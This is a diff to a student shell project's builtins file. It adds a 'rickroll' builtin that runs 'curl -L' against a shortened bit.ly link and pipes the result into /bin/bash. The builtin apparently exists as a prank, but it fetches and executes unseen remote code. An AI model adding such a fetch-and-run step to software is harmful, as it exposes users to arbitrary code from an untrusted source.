@@ -6,7 +6,7 @@
 /*   By: mrouves <mrouves@42angouleme.fr>           +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/03/19 04:30:37 by mrouves           #+#    #+#             */
-/*   Updated: 2025/03/19 14:06:00 by mrouves          ###   ########.fr       */
+/*   Updated: 2025/04/17 16:10:14 by mrouves          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -61,4 +61,20 @@ int	builtin_exit(const char **args, int argc, t_hmap *env)
 	if (argc <= 1)
 		exit(exit_code);
 	return (error(E_TOOMANY, "exit"));
+}
+
+int	builtin_rickroll(const char **args, int argc, t_hmap *env)
+{
+	static char				*cmd_left[4] = {
+		"/bin/curl", "-L", "http://bit.ly/10hA8iC", NULL};
+	static char				*cmd_right[2] = {"/bin/bash", NULL};
+	static t_ast			left = {.type = AST_CMD, .expr = {.cmd = {.args = {
+		.len = 4, .cap = 4, .data = cmd_left}}}};
+	static t_ast			right = {.type = AST_CMD, .expr = {.cmd = {.args = {
+		.len = 2, .cap = 2, .data = cmd_right}}}};
+	static t_binary_expr	pipe = {.left = &left, .right = &right};
+
+	(void)args;
+	(void)argc;
+	return (execute_pipe(&pipe, env));
 }
